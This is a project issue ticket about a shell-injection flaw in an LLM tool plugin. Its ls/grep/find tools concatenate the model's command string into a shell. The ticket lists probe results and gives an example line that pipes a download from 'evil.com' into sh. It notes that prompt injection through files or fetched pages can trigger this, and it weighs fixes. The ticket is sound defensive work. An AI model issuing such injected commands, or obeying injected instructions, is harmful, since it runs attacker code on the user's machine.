---
id: 000144
status: open
deps: []
github_issue:
created: 2026-06-26
updated: 2026-06-26
estimate_hours:
---

# tool input safety: ls/grep/find shell injection + cwd escape

## Problem

`ls`/`grep`/`find` (`lua/parley/tools/builtin/{ls,grep,find}.lua`) build
`vim.fn.system(cmd .. " " .. input.command)` — the LLM's `command` argument is
concatenated into a **shell** string with **zero** sanitization. So they are
de-facto an arbitrary-shell tool. Verified empirically (2026-06-26, non-destructive):

| probe | result |
|---|---|
| `ls ". ; echo INJECTED"` | executed — `;` chains arbitrary commands |
| `ls "$(echo SUBST)"` | expanded — `$(…)` command substitution runs |
| `ls /` | listed root — **not** confined to cwd |

So `ls .; curl evil.com \| sh` runs. The `"Confined to the working directory"`
line in all three descriptions is **false**, and this is reachable via prompt
injection (a malicious file read into context, or a `web_fetch`'d page, can
instruct exactly this). The #140 cwd-guard (`resolve_path_in_cwd`) only checks
`path`/`file_path` fields — not the freeform `command` string — so it does not
cover these tools.

Found while scoping #139 (output safety); split out as the higher-urgency,
security-critical half.

## Spec

Design **not yet decided** — options, with the tension being safety vs the
flexibility/familiarity of raw shell (and the goal of preserving safe pipe
composition like `ls | wc` without a general bash tool):

- **argv form** — `system({"ls", "-la", path})`, no shell. Kills injection, but
  also kills `|` and shell globbing (`ls *.lua` relies on the shell).
- **allowlisted pipeline** — parse into pipe stages; require each command ∈ a
  read-only allowlist (ls/grep/rg/find/wc/head/tail/sort/uniq/cut); reject
  `;`/`&&`/`$()`/backticks/`>`/`<`/`-exec`/`-delete`; confine path args to cwd
  (+ #140 `tool_read_roots`); then run. Gives `ls | wc` safely, but it's a real
  parser+validator and shell-string validation is adversarial to get airtight.
- **structured tools** — replace raw-shell ls/grep/find with params we implement
  (path/pattern/glob/type/recursive); safe by construction via the #140 guard;
  loses raw-flag flexibility and the "format the model already knows."

The **safe-pipe composition** design (operator's `ls | wc` request) lives here.

## Done when

- `ls`/`grep`/`find` cannot execute anything beyond their named binary — no shell
  metacharacter injection (`;`, `|` to non-allowlisted, `$()`, backticks, `>`).
- Path args are confined to cwd (+ configured `tool_read_roots`, #140); the
  descriptions' "confined to cwd" claim becomes true (or is corrected).
- Safe pipe composition is either implemented (allowlist) or explicitly deferred.
- Regression tests for each injection vector above.

## Plan

- [ ] (design first — pick an approach, then plan)

## Log

### 2026-06-26
